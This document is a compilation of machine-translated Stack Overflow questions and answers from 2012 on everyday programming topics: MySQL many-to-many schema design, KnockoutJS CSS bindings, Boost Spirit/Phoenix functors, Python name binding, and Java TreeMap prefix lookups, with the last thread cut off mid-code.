# php - 字段中包含数组的新表或字段（php/mysql）

> ID：13530991
> 
> 赞同：1
> 
> 时间：2012-11-23T14:23:09.447
> 
> 标签：php, mysql

我需要在表中的一个字段中存储多个 id，或者添加另一个表来存储 id。

每个成员基本上都会有喜欢的文章。每篇文章都有一个 ID，当用户单击“添加到收藏夹”按钮时存储该 ID。

我的问题是：

我是创建一个字段并在此字段中添加多个 id，还是创建一个表来添加这些 id？

做这个的最好方式是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:25:41.787

这是一个多对多的关系，您需要一个额外的表来存储 user_id 和 article_id 对（分别是 user 和 article 表的主键）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T14:25:29.693

您应该创建一个新表，而不是在单个列中使用逗号分隔值。

保持数据库规范化。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T14:25:22.510

您[创建一个单独的表](http://www.tonymarston.net/php-mysql/many-to-many.html)，这就是关系数据库中的工作方式。另一种解决方案（一列中以逗号分隔的 id 列表）将导致数据库无法维护。例如，如果您想知道一篇文章被收藏了多少次怎么办？您不能在这样的列上编写查询。

您的表将需要存储用户的 id 和文章的 id - 这些是指相应表的主键。对于查询，您可以使用`JOIN`s 或嵌套`SELECT`查询。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T14:40:19.060

正如 lafor 已经指出的，这是一个多对多的关系，您最终会得到三个表：用户、文章和收藏夹：

```
CREATE TABLE user(
    id INT NOT NULL,
    ...
    PRIMARY KEY (id)
) ENGINE=INNODB;

CREATE TABLE article (
    id INT NOT NULL,
    ...
    PRIMARY KEY (id)
) ENGINE=INNODB;

CREATE TABLE favorite (
    userID INT NOT NULL,
    articleID INT NOT NULL,
    FOREIGN KEY (userID) REFERENCES user(id) ON DELETE CASCADE,
    FOREIGN KEY (articleID) REFERENCES article(id) ON DELETE CASCADE,
    PRIMARY KEY (userID, articleID)
) ENGINE=INNODB; 
```

如果您想选择所有用户最喜欢的文章，请使用 JOIN：

```
SELECT * FROM favorite f JOIN article a ON f.articleID = a.id WHERE f.userID = ? 
```

If you want to know why you should use this schema, I recommend reading about [database normilization](http://en.wikipedia.org/wiki/Database_normalization). With multiple IDs in a single field you would even violate the first normal form and thus land in a world of pain...

# knockout.js - KnockoutJS 中的 CSS 绑定根本不起作用

> ID：13530993
> 
> 赞同：1
> 
> 时间：2012-11-23T14:23:22.303
> 
> 标签：knockout.js

我正在使用 KO 的 2.2.0 版本，我正在尝试为`option`这样的元素设置 CSS：

```
<select data-bind="foreach: $data.answers, value: selectedAnswer">
    <option data-bind="css: $data.getScoringLevel, value: $data, text: $data.text"></option>
</select> 
```

这是 getScoringLevel() 函数：

```
// Answer.
var Answer = function () {
    var self = this;

    self.id = '';
    self.text = '';
    self.sendAnswerToWebService = true;
    self.scoringLevel = ko.observable(0);

    self.getScoringLevel = ko.computed(function () {
        switch (self.scoringLevel()) {
            case 1:
                return 'red';
            case 2:
                return 'orange';
            case 3:
                return 'yellow';
            default:
                return '';
        }
    }, self);
}; 
```

我可以看到该函数已执行，因为我在其中放置的断点被命中，但呈现的 HTML 如下所示：

```
<option data-bind="css: $data.getScoringLevel, value: $data, text: $data.text" value="">Choose....</option> 
```

`class`由于某种原因没有设置属性。例如，我期待在某个地方出现 `class="red"'。

有人可以告诉我我做错了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:34:26.383

有用。您会看到这样的 html，因为默认值为`scoringLevel`0 并且您的计算返回空字符串。如果您更改它，例如更改为 1，则会将红色类分配给该选项。

这是一个小提琴：http: [//jsfiddle.net/vyshniakov/DtDk7/1/](http://jsfiddle.net/vyshniakov/DtDk7/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T15:04:39.100

另一个要查看的示例：http: [//jsfiddle.net/TqgHb/3/](http://jsfiddle.net/TqgHb/3/)（修订版 3 修复了 JSLint 警告 + 使用`this`而不是关闭`self`）

我所做的唯一更改是使用`$index`选项值并删除`$data`绑定中不需要的内容 + 对 Answer 类进行轻微简化。

# c++ - 基本的提升精神语义动作无法编译

> ID：13530994
> 
> 赞同：2
> 
> 时间：2012-11-23T14:23:26.703
> 
> 标签：c++, boost-spirit, decltype, result-of

我正在尝试向 ast 添加大于运算符`>`：代码与文档中的代码 95% 相同。

**下面的两个兴趣点**

*   我正在尝试编写对大于的支持的代码块：在下面的代码中注释。
*   解析中的一行`term`无法编译，因为我还不了解语义动作：不确定如何通过 phoenix 和语义动作绑定`lhs`of 。`lhs > rhs`

*对于 Spirit 的普通用户来说，该解决方案应该是微不足道的，但我仍在学习，到目前为止只能通过示例获得。*

任何帮助，将不胜感激。TIA。

**代码**

```
#define BOOST_SPIRIT_DEBUG

#include <boost/spirit/include/qi.hpp>
#include <boost/config/warning_disable.hpp>
#include <boost/spirit/include/qi.hpp>
#include <boost/spirit/include/phoenix_core.hpp>
#include <boost/spirit/include/phoenix_operator.hpp>
#include <boost/spirit/include/phoenix_stl.hpp>
#include <boost/spirit/include/classic_symbols.hpp>
#include <boost/fusion/include/adapt_struct.hpp>
#include <boost/fusion/include/io.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/regex.hpp>   // std::regex not fully implemented in stdc++ yet

#include <string>
#include <map>
#include <utility>
#include <functional>
#include <iostream>
#include <string>
#include <vector>

namespace client
{
    namespace qi = boost::spirit::qi;
    namespace ascii = boost::spirit::ascii;

    struct binary_op;
    struct unary_op;
    struct nil {};

    struct expression_ast
    {
        typedef
        boost::variant<
        nil // can't happen!
        , double
        , std::string
        , boost::recursive_wrapper<expression_ast>
        , boost::recursive_wrapper<binary_op>
        , boost::recursive_wrapper<unary_op>
        >
        type;

        expression_ast()
            : m_expr(nil()) {}

        template <typename Expr>
        expression_ast(Expr const& expr)
            : m_expr(expr) {}

        expression_ast& operator+=(expression_ast const& rhs);
        expression_ast& operator-=(expression_ast const& rhs);
        expression_ast& operator*=(expression_ast const& rhs);
        expression_ast& operator/=(expression_ast const& rhs);

        type m_expr;
    };

    struct binary_op
    {
        binary_op(
            char op
            , expression_ast const& left
            , expression_ast const& right)
            : m_op(op), m_left(left), m_right(right) {}

        char m_op;
        expression_ast m_left;
        expression_ast m_right;
    };

    struct unary_op
    {
        unary_op(
            char op
            , expression_ast const& subject)
            : m_op(op), m_subject(subject) {}

        char m_op;
        expression_ast m_subject;
    };

    expression_ast& expression_ast::operator+=(expression_ast const& rhs)
    {
        m_expr = binary_op('+', m_expr, rhs);
        return *this;
    }

    expression_ast& expression_ast::operator-=(expression_ast const& rhs)
    {
        m_expr = binary_op('-', m_expr, rhs);
        return *this;
    }

    expression_ast& expression_ast::operator*=(expression_ast const& rhs)
    {
        m_expr = binary_op('*', m_expr, rhs);
        return *this;
    }

    expression_ast& expression_ast::operator/=(expression_ast const& rhs)
    {
        m_expr = binary_op('/', m_expr, rhs);
        return *this;
    }

    // We should be using expression_ast::operator-. There's a bug
    // in phoenix type deduction mechanism that prevents us from
    // doing so. Phoenix will be switching to BOOST_TYPEOF. In the
    // meantime, we will use a phoenix::function below:
    struct negate_expr
    {
        template <typename T>
        struct result
        {
            typedef T type;
        };

        expression_ast operator()(expression_ast const& expr) const
        {
            return expression_ast(unary_op('-', expr));
        }
    };

    static boost::phoenix::function<negate_expr> neg;

    struct ast_print
    {
        typedef std::string result_type;

        std::string operator()(qi::info::nil) const
        {
            return "";
        }
        std::string operator()(std::string const& str) const
        {
            return str;
        }
        std::string operator()(double d) const
        {
            std::ostringstream oss;
            oss << d;
            return oss.str();
        }

        std::string operator()(expression_ast const& ast) const
        {
            return boost::apply_visitor(*this, ast.m_expr);
        }

        std::string operator()(binary_op const& expr) const
        {
            std::ostringstream oss;
            oss << "op:" << expr.m_op << "(";
            oss << boost::apply_visitor(*this, expr.m_left.m_expr);
            oss << ", ";
            oss << boost::apply_visitor(*this, expr.m_right.m_expr);
            oss << ')';
            return oss.str();
        }

        std::string operator()(unary_op const& expr) const
        {
            std::ostringstream oss;
            oss << "op:" << expr.m_op << "(";
            oss << boost::apply_visitor(*this, expr.m_subject.m_expr);
            oss << ')';
            return oss.str();
        }
    };

    std::ostream& operator << (std::ostream& stream, const expression_ast& expr)
    {
        ast_print printer;
        stream << printer(expr) << std::endl;
        return stream;
    }

    // CODE ADDED HERE ------------------------------------------------------------
    template< char OP >
    struct binary_expr
    {
        template <typename T>
        struct result
        {
            typedef T type;
        };

        expression_ast operator()(expression_ast const& lhs,expression_ast const& rhs) const
        {
            return expression_ast(binary_op( OP, lhs, rhs ));
        }
    };

    static boost::phoenix::function<binary_expr<'>'>> gt;
    // CODE ADDED END HERE -------------------------------------------------------

    template <typename Iterator>
    struct ParserGenerator : qi::grammar<Iterator, expression_ast(), ascii::space_type>
    {
        ParserGenerator() : ParserGenerator::base_type(expression)
    {
        using qi::_val;
        using qi::_1;
        using qi::double_;
        using qi::iso8859_1::char_;
        using qi::iso8859_1::space;
        using qi::eol;
        using boost::spirit::ascii::string;

        comment =
            space >> ("//" >> *(char_ - eol) >> eol)
            ;

        expression =
            term                            [_val = _1]
            >> *(   ('+' >> term            [_val += _1])
                |   ('-' >> term            [_val -= _1])
                )
            ;

        term =
            factor                          [_val = _1]
            >> *(   ('*' >> factor          [_val *= _1])
                |   ('/' >> factor          [_val /= _1])
//          |   ('>' >> factor          [_val = gt(qi::_val,_1)]) // PROBLEM HERE!
                )
            ;

        factor =
            symbol                          [_val = _1]
            | double_                       [_val = _1]
            |   '(' >> expression           [_val = _1] >> ')'
            |   ('-' >> factor              [_val = neg(_1)])
            |   ('+' >> factor              [_val = _1])
            ;

        symbol %= 
            (symbol_raw 
            >> *( string("[") >> +qi::digit >> string("]"))
            >> *( string(".") >> symbol ))
            ;

        symbol_raw %= 
            +(qi::alpha | qi::char_( "_" ))
            ;

        BOOST_SPIRIT_DEBUG_NODE(expression);
        BOOST_SPIRIT_DEBUG_NODE(term);
        BOOST_SPIRIT_DEBUG_NODE(factor);
        BOOST_SPIRIT_DEBUG_NODE(comment);
        BOOST_SPIRIT_DEBUG_NODE(symbol);
        BOOST_SPIRIT_DEBUG_NODE(symbol_raw);
    }

    qi::rule<Iterator, expression_ast(), ascii::space_type>
        expression, term, factor, comment;

    qi::rule<Iterator, std::string(), ascii::space_type>
        symbol, symbol_raw;
    };
}

int main(int argc, char* argv[])
{
    using boost::spirit::ascii::space;
    using client::expression_ast;
    using client::ast_print;

    typedef std::string::const_iterator iterator_type;
    typedef client::ParserGenerator<iterator_type> ParserGenerator;

    ParserGenerator pg;   // our grammar
    std::string predicate( "i_.c>x[0]" );
    expression_ast  ast;
    ast_print       printer;

    iterator_type iter = predicate.begin(), end = predicate.end();
    if ( phrase_parse( iter, end, pg, space, ast ))
    {
        std::cerr << printer( ast ) << std::endl;
    }

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T23:41:13.773

TL;DR 使用

```
template <typename, typename> struct result { typedef expression_ast type; }; 
```

内部`binary_expr`结构。原因如下：

* * *

您声明一个仿函数对象，用作 Phoenix*懒惰的演员*。

在 Boost 文档中，仿函数就是所谓的*延迟/多态可调用对象 (PCE) 。*这意味着构建 Phoenix actor 的表达式模板实际上只会*在实际应用时*对函数参数进行实际的重载解析/类型推导。

*无法*推断函数返回类型（就像它不能在常规（非惰性）C++ 中一样）。这是 boost 库使用 BOOST_RESULT_OF 协议的地方。

> **注意**RESULT_OF 协议在使用 C++11 时已过时/冗余，因为 C++11 具有`decltype`. 要启用它，在大多数编译器上，您需要
> 
> ```
> #define BOOST_RESULT_OF_USE_DECLTPYE 
> ```
> 
> （尽管 v1_52_0 的发行说明清楚地表明它`decltype`正在成为支持它的编译器的默认值）。

该协议的含义是：

*   当您使用带参数的多态可调用对象时*`n`*，boost 将在嵌套类模板中查找嵌套*typedef*，`type`并使用实际参数类型进行参数化。*这将是返回类型**`result`*`n`**
***   实际的仿函数调用*调用* `operator()`这些参数。在这里，将留给 C++ 进行重载解析。**

 **通常，您应该以完全参数化的方式编写仿函数：

```
template<char OP>
struct binary_expr
{
    template <typename, typename> struct result { typedef expression_ast type; };

    template <typename A, typename B>
    typename result<A,B>::type operator()(A const&a,B const&b) const {
        return expression_ast(binary_op( OP, a, b ));
    }
}; 
```

这行得通。但是，因为参数类型的实际重载解析是由编译器完成的，所以您可以更改`operator()`签名以使用固定类型：

```
template <typename A, typename B>
expression_ast operator()(A const&a,B const&b) const {
    return binary_op(OP, a, b);
} 
```

如果你愿意，你可以取消（一些）模板参数：

```
template <typename E>
expression_ast operator()(E const&a,E const&b) const {
    return binary_op(OP, a, b);
} 
```

甚至根本不是函数模板：

```
expression_ast operator()(expression_ast const&,expression_ast const&) const; 
```

一切都*很好*，只要一个重载与传递的*实际参数类型匹配。*不过，***重要的一点***`result<...>::type`是，无论 的签名如何，都会对 进行评估`operator()`，因此***它需要精确的参数数量***。

另请注意，您可以以这种方式组合不同数量的函子：

```
template <char OP> struct operator_expr 
{
    template <typename T, typename=T> struct result 
        { typedef expression_ast type; };

    expression_ast operator()(expression_ast const& expr) const
    { return expression_ast(unary_op(OP, expr)); }

    expression_ast operator()(expression_ast const&a, expression_ast const&b) const 
    { return binary_op(OP, a, b); }
};

static boost::phoenix::function<operator_expr<'-'>> neg;
static boost::phoenix::function<operator_expr<'>'>> gt; 
```

这是可行的，因为`result<T>::type`和`result<T,U>::type`都是具有此定义的有效类型表达式。

* * *

### 奖金说明：

1.  你说的地方有种陌生感

    ```
    template <typename T> struct result { typedef T type; }; 
    ```

    代替

    ```
    template <typename> struct result { typedef expression_ast type; }; 
    ```

    这是因为返回类型实际上*不应该*根据实际参数类型而变化。在您的示例中，参数类型*通常*是相同的，但在技术上没有意义。

2.  如果你使用 decltype，你可以在没有 BOOST_RESULT_OF 协议的情况下做事。这意味着您可以删除嵌套`result`结构

3.  您还可以将正常功能改编为 Phoenix 演员：

    ```
    #define BOOST_SPIRIT_USE_PHOENIX_V3

    // ...

    expression_ast neg_expr(expression_ast const&a)                         { return unary_op ('-', a); }
    expression_ast gt_expr (expression_ast const&a, expression_ast const&b) { return binary_op('>', a, b); }

    BOOST_PHOENIX_ADAPT_FUNCTION(expression_ast, neg, neg_expr, 1)
    BOOST_PHOENIX_ADAPT_FUNCTION(expression_ast, gt,  gt_expr,  2) 
    ```

    这基本上会*为您*编写函子对象，包括 RESULT_OF 协议位。

4.  最后，您可以使用标准 Phoenix 演员而不是定义自定义演员。在这种情况下，不需要上述任何一项：

    ```
    using phx = boost::phoenix;
    // ...
       |   ('>' >> factor [_val = phx::construct<binary_op>('>', _val, _1)]) // PROBLEM HERE!
    // ...
       |   ('-' >> factor [_val = phx::construct<unary_op>('-', _1)]) 
    ```

## 包起来

完整的代码在这里：http: **[//ideone.com/Xv9IH1](http://ideone.com/Xv9IH1)**并在

*   MSVC 2012，提升 1_52_0，Win64
*   GCC 4.8，提升 1_52_0，Win64**

# python - Python变量是指针吗？否则，它们是什么？

> ID：13530998
> 
> 赞同：92
> 
> 时间：2012-11-23T14:23:39.777
> 
> 标签：python, pointers, variables, identifier

据我所知，Python 中的变量只是指针。

基于此规则，我可以假设此代码段的结果：

```
i = 5
j = i
j = 3
print(i) 
```

将是`3`。

但我得到了一个意想不到的结果，它是`5`。

此外，我的 Python 书确实涵盖了这个例子：

```
i = [1,2,3]
j = i
i[0] = 5
print(j) 
```

结果将是`[5,2,3]`。

我理解错了什么？

* * *

## 回答 #1

> 赞同：97
> 
> 时间：2012-11-23T14:29:18.320

我们称它们为参考。他们像这样工作

```
i = 5     # create int(5) instance, bind it to i
j = i     # bind j to the same int as i
j = 3     # create int(3) instance, bind it to j
print i   # i still bound to the int(5), j bound to the int(3) 
```

小整数被实习，但这对这个解释并不重要

```
i = [1,2,3]   # create the list instance, and bind it to i
j = i         # bind j to the same list as i
i[0] = 5      # change the first item of i
print j       # j is still bound to the same list as i 
```

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2012-11-23T14:25:06.987

变量不是指针。当您分配给一个变量时，您将名称*绑定*到一个对象。从那时起，您可以通过使用名称来引用对象，直到该名称被重新绑定。

在您的第一个示例中，名称`i`绑定到 value `5`。将不同的值绑定到名称`j`上没有任何影响`i`，因此当您稍后打印该值时，`i`该值的值仍然是`5`.

在第二个示例中，您将`i`和绑定`j`到**同一个**列表对象。当您修改列表的内容时，无论您使用哪个名称来引用列表，您都可以看到更改。

请注意，如果您说“两个列表都已更改”，那将是不正确的。只有一个列表，但它有两个引用它的名称 (`i`和)。`j`

**相关文档**

*   [执行模型 - 命名和绑定](http://docs.python.org/2/reference/executionmodel.html)

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2016-04-25T20:26:57.473

# Python 变量是绑定到对象的名称

从[文档](https://docs.python.org/reference/executionmodel.html)：

> 名称指的是对象。名称由名称绑定操作引入。**程序文本中每次出现的名称指的是**在包含使用的最内层功能块中建立的该名称的绑定。

当你这样做

```
i = 5
j = i 
```

这和这样做是一样的：

```
i = 5
j = 5 
```

**`j`不指向`i`，并且在分配之后，`j`不知道`i`存在。** `j`简单地绑定到`i`分配时指向的任何内容。

如果你在同一行做作业，它看起来像这样：

```
i = j = 5 
```

结果将完全相同。

因此，后来做

```
i = 3 
```

不会改变`j`指向的东西——你可以交换它——`j = 3`不会改变`i`指向的东西。

# 您的示例不会删除对列表的引用

所以当你这样做时：

```
i = [1,2,3]
j = i 
```

这和这样做是一样的：

```
i = j = [1,2,3] 
```

所以`i`两者`j`都指向同一个列表。然后你的例子改变了列表：

```
i[0] = 5 
```

Python 列表是可变对象，因此当您从一个引用更改列表并从另一个引用查看它时，您会看到相同的结果，因为它是同一个列表。

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2019-08-06T16:51:51.397

TLDR：Python*名称*的工作方式类似于具有自动取消/引用的指针，但不允许显式指针操作。其他目标表示间接，其行为类似于指针。

* * *

Python 语言规范没有定义名称等实际上*是*什么，只定义了它们的行为方式。但是，可以使用指针来解释该行为。

CPython 实现在底层使用[类型指针`PyObject*`](https://docs.python.org/3/c-api/structures.html#c.PyObject)。因此，可以将名称语义转换为指针操作。关键是将*名称*与实际*对象*分开。

示例 Python 代码包括名称 ( `i`) 和对象 ( `5`)。

```
i = 5  # name `i` refers to object `5`
j = i  # ???
j = 3  # name `j` refers to object `3` 
```

这可以粗略地翻译成具有*单独*名称和对象的 C 代码。

```
int three=3, five=5;  // objects
int *i, *j;           // names
i = &five;   // name `i` refers to position of object `5`
j = i;       // name `j` refers to referent of `i`
j = &three;  // name `j` refers to position of object `3` 
```

重要的部分是“名称作为指针”不存储对象！我们没有定义`*i = five`，但是`i = &five` 。名称和对象彼此独立存在。

**名称仅*指向*内存中的现有对象。**

从名称分配到名称时，不交换任何对象！当我们定义`j = i`时，这等价于`j = &five`。既不`i`也不`j`与对方相连。

```
+- name i -+ -\
               \
                --> + <five> -+
               /    |        5 |
+- name j -+ -/     +----------+ 
```

因此，[更改一个名称的目标不会影响另一个名称](https://stackoverflow.com/questions/56667280/if-two-variables-point-to-the-same-object-why-doesnt-reassigning-one-variable)。它只更新该特定名称所指向的内容。

* * *

Python 还有[其他种类的名称元素](https://docs.python.org/3/reference/simple_stmts.html#assignment-statements)：属性引用 ( `i.j`)、订阅 ( `i[j]`) 和切片 ( `i[:j]`)。与直接引用对象的名称不同，所有三个都间接引用对象的*元素*。

示例代码包括名称 ( `i`) 和订阅 ( `i[0]`)。

```
i = [1,2,3]  # name `i` refers to object `[1, 2, 3]`
j = i        # name `j` refers to referent of `i`
i[0] = 5     # ??? 
```

CPython 在底层`list`使用 C`PyObject*`指针数组。这可以再次粗略地转换为具有单独名称和对象的 C 代码。

```
typedef struct{
    int *elements[3];
} list;  // length 3 `list` type

int one = 1, two = 2, three = 3, five = 5;
list values = {&one, &two, &three};  // objects
list *i, *j;                         // names
i = &values;             // name `i` refers to object `[1, 2, 3]`
j = i;                   // name `j` refers to referent of `i`
i->elements[0] = &five;  // leading element of `i` refers to object `5` 
```

重要的是我们没有更改任何名称！我们确实改变`i->elements[0]`了，我们的名字都指向的对象的元素。

**现有复合对象的值可能会更改。**

*通过*名称更改对象的值时，名称不会更改。两者`i`并且`j`仍然引用同一个对象，我们可以更改其值。

```
+- name i -+ -\
               \
                --> + <values> -+
               /    |  elements | --> [1, 2, 3]
+- name j -+ -/     +-----------+ 
```

中间对象的*行为*类似于指针，因为我们可以直接更改它所指向的内容并从多个名称中引用它。

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2012-11-23T14:28:29.257

它们不完全是指针。它们是对对象的引用。对象可以是可变的，也可以是不可变的。不可变对象在修改时会被复制。可变对象就地更改。整数是一个不可变对象，您可以通过 i 和 j 变量引用它。列表是一个可变对象。

在你的第一个例子中

```
i = 5
# The label i now references 5

j = i
# The label j now references what i references

j = 3
# The label j now references 3

print i
# i still references 5 
```

在您的第二个示例中：

```
i = [1, 2, 3]
# 'i' references a list object (a mutable object)
j = i
# 'j' now references the same object as 'i' (they reference the same mutable object)

i[0] = 5
# Sets first element of references object to 5

print j
# Prints the list object that 'j' references. It's the same one as 'i'. 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-11-23T14:35:39.757

赋值不会修改对象；它所做的只是改变变量指向的位置。改变一个变量点的位置不会改变另一个变量点的位置。

您可能正在考虑列表和字典是可变类型的事实。有一些操作符可以就地修改实际对象，如果您使用其中之一，您将看到指向同一对象的所有变量的变化：

```
x = []
y = x
x.append(1)
# x and y both are now [1] 
```

但是赋值仍然只是移动指针：

```
x = [2]
# x now points to new list [2]; y still points to old list [1] 
```

与字典和列表不同，数字是不可变的。如果你这样做`x = 3; x += 2`了，你并没有将数字 3 转换为数字 5。您只是将变量`x`指向 5 。3 仍然没有改变，任何指向它的变量仍然会将 3 视为它们的值。

（在实际实现中，数字可能根本不是引用类型；更有可能的是变量实际上直接包含值的表示，而不是指向它。但是该实现细节不会改变涉及不可变类型的语义.)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-11-23T14:25:22.633

当您设置`j=3`标签`j`不再适用（指向）时`i`，它开始指向整数`3`。名称`i`仍然是指您最初设置的值，`5`.

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-03-17T19:34:47.947

'=' 符号左侧的任何变量都分配有 '=' 右侧的值

`i = 5`

`j = i` --- j 有 5 个

`j = 3` --- j 有 3（覆盖 5 的值）但关于 i 没有任何改变

`print(i)`-- 所以这会打印 5

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2017-08-11T11:08:39.810

在 Python 中，一切都是对象，包括返回的内存片段本身。这意味着，当创建新的内存块时（无论您创建了什么：int、str、自定义对象等），您都有一个新的内存对象。在您的情况下，这是对 3 的分配，它创建一个新的（内存）对象，因此具有一个新地址。

如果你运行以下命令，你会很容易明白我的意思。

```
i = 5
j = i
print("id of j: {}", id(j))
j = 3
print("id of j: {}", id(j)) 
```

IMO，内存方面，这是 C 和 Python 之间的关键理解/区别。在 C/C++ 中，您将返回一个内存指针（当然，如果您使用指针语法）而不是内存对象，这为您在更改引用地址方面提供了更大的灵活性。

# java - 从键以某个表达式开头的 Map 获取所有值的最快方法

> ID：13530999
> 
> 赞同：23
> 
> 时间：2012-11-23T14:23:44.283
> 
> 标签：java, dictionary

考虑你有一个`map<String, Object> myMap`.

给定表达式`"some.string.*"`，我必须检索所有`myMap`键以该表达式开头的值。

我试图避免`for loop`s 因为`myMap`将给出一组表达式，而不仅仅是一个表达式，并且`for loop`为每个表达式使用变得繁琐的性能明智。

最快的方法是什么？

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2012-11-23T14:48:23.867

如果您使用[NavigableMap](http://docs.oracle.com/javase/6/docs/api/java/util/NavigableMap.html)（例如[TreeMap](http://docs.oracle.com/javase/6/docs/api/java/util/TreeMap.html)），您可以使用底层树数据结构的好处，并执行以下操作（具有`O(lg(N))`复杂性）：

```
public SortedMap<String, Object> getByPrefix( 
        NavigableMap<String, Object> myMap, 
        String prefix ) {
    return myMap.subMap( prefix, prefix + Character.MAX_VALUE );
} 
```

**更多扩展示例：**

```
import java.util.NavigableMap;
import java.util.SortedMap;
import java.util.TreeMap;

public class Test {

    public static void main( String[] args ) {
        TreeMap<String, Object> myMap = new TreeMap<String, Object>();
        myMap.put( "111-hello", null );
        myMap.put( "111-world", null );
        myMap.put( "111-test", null );
        myMap.put( "111-java", null );

        myMap.put( "123-one", null );
        myMap.put( "123-two", null );
        myMap.put( "123--three", null );
        myMap.put( "123--four", null );

        myMap.put( "125-hello", null );
        myMap.put( "125--world", null );

        System.out.println( "111 \t" + getByPrefix( myMap, "111" ) );
        System.out.println( "123 \t" + getByPrefix( myMap, "123" ) );
        System.out.println( "123-- \t" + getByPrefix( myMap, "123--" ) );
        System.out.println( "12 \t" + getByPrefix( myMap, "12" ) );
    }

    private static SortedMap<String, Object> getByPrefix(
            NavigableMap<String, Object> myMap,
            String prefix ) {
        return myMap.subMap( prefix, prefix + Character.MAX_VALUE );
    }
} 
```

输出是：

```
111     {111-hello=null, 111-java=null, 111-test=null, 111-world=null}
123     {123--four=null, 123--three=null, 123-one=null, 123-two=null}
123--   {123--four=null, 123--three=null}
12      {123--four=null, 123--three=null, 123-one=null, 123-two=null, 125--world=null, 125-hello=null} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-23T15:11:24.600

我`MapFilter`最近写了一个就是为了这样的需要。您还可以过滤过滤后的地图，这非常有用。

如果您的表达式具有“some.byte”和“some.string”之类的共同词根，那么首先按共同词根过滤（在本例中为“some.”）将为您节省大量时间。请参阅`main`一些简单的示例。

请注意，对过滤后的地图进行更改会更改基础地图。

```
public class MapFilter<T> implements Map<String, T> {

    // The enclosed map -- could also be a MapFilter.
    final private Map<String, T> map;

    // Use a TreeMap for predictable iteration order.
    // Store Map.Entry to reflect changes down into the underlying map.
    // The Key is the shortened string. The entry.key is the full string.
    final private Map<String, Map.Entry<String, T>> entries = new TreeMap<>();
    // The prefix they are looking for in this map.
    final private String prefix;

    public MapFilter(Map<String, T> map, String prefix) {
        // Store my backing map.
        this.map = map;
        // Record my prefix.
        this.prefix = prefix;
        // Build my entries.
        rebuildEntries();
    }

    public MapFilter(Map<String, T> map) {
        this(map, "");
    }

    private synchronized void rebuildEntries() {
        // Start empty.
        entries.clear();
        // Build my entry set.
        for (Map.Entry<String, T> e : map.entrySet()) {
            String key = e.getKey();
            // Retain each one that starts with the specified prefix.
            if (key.startsWith(prefix)) {
                // Key it on the remainder.
                String k = key.substring(prefix.length());
                // Entries k always contains the LAST occurrence if there are multiples.
                entries.put(k, e);
            }
        }

    }

    @Override
    public String toString() {
        return "MapFilter(" + prefix + ") of " + map + " containing " + entrySet();
    }

    // Constructor from a properties file.
    public MapFilter(Properties p, String prefix) {
        // Properties extends HashTable<Object,Object> so it implements Map.
        // I need Map<String,T> so I wrap it in a HashMap for simplicity.
        // Java-8 breaks if we use diamond inference.
        this(new HashMap<>((Map) p), prefix);
    }

    // Helper to fast filter the map.
    public MapFilter<T> filter(String prefix) {
        // Wrap me in a new filter.
        return new MapFilter<>(this, prefix);
    }

    // Count my entries.
    @Override
    public int size() {
        return entries.size();
    }

    // Are we empty.
    @Override
    public boolean isEmpty() {
        return entries.isEmpty();
    }

    // Is this key in me?
    @Override
    public boolean containsKey(Object key) {
        return entries.containsKey(key);
    }

    // Is this value in me.
    @Override
    public boolean containsValue(Object value) {
        // Walk the values.
        for (Map.Entry<String, T> e : entries.values()) {
            if (value.equals(e.getValue())) {
                // Its there!
                return true;
            }
        }
        return false;
    }

    // Get the referenced value - if present.
    @Override
    public T get(Object key) {
        return get(key, null);
    }

    // Get the referenced value - if present.
    public T get(Object key, T dflt) {
        Map.Entry<String, T> e = entries.get((String) key);
        return e != null ? e.getValue() : dflt;
    }

    // Add to the underlying map.
    @Override
    public T put(String key, T value) {
        T old = null;
        // Do I have an entry for it already?
        Map.Entry<String, T> entry = entries.get(key);
        // Was it already there?
        if (entry != null) {
            // Yes. Just update it.
            old = entry.setValue(value);
        } else {
            // Add it to the map.
            map.put(prefix + key, value);
            // Rebuild.
            rebuildEntries();
        }
        return old;
    }

    // Get rid of that one.
    @Override
    public T remove(Object key) {
        // Do I have an entry for it?
        Map.Entry<String, T> entry = entries.get((String) key);
        if (entry != null) {
            entries.remove(key);
            // Change the underlying map.
            return map.remove(prefix + key);
        }
        return null;
    }

    // Add all of them.
    @Override
    public void putAll(Map<? extends String, ? extends T> m) {
        for (Map.Entry<? extends String, ? extends T> e : m.entrySet()) {
            put(e.getKey(), e.getValue());
        }
    }

    // Clear everything out.
    @Override
    public void clear() {
        // Just remove mine.
        // This does not clear the underlying map - perhaps it should remove the filtered entries.
        for (String key : entries.keySet()) {
            map.remove(prefix + key);
        }
        entries.clear();
    }

    @Override
    public Set<String> keySet() {
        return entries.keySet();
    }

    @Override
    public Collection<T> values() {
        // Roll them all out into a new ArrayList.
        List<T> values = new ArrayList<>();
        for (Map.Entry<String, T> v : entries.values()) {
            values.add(v.getValue());
        }
        return values;
    }

    @Override
    public Set<Map.Entry<String, T>> entrySet() {
        // Roll them all out into a new TreeSet.
        Set<Map.Entry<String, T>> entrySet = new TreeSet<>();
        for (Map.Entry<String, Map.Entry<String, T>> v : entries.entrySet()) {
            entrySet.add(new Entry<>(v));
        }
        return entrySet;
    }

    /**
     * An entry.
     *
     * @param <T> The type of the value.
     */
    private static class Entry<T> implements Map.Entry<String, T>, Comparable<Entry<T>> {

        // Note that entry in the entry is an entry in the underlying map.

        private final Map.Entry<String, Map.Entry<String, T>> entry;

        Entry(Map.Entry<String, Map.Entry<String, T>> entry) {
            this.entry = entry;
        }

        @Override
        public String getKey() {
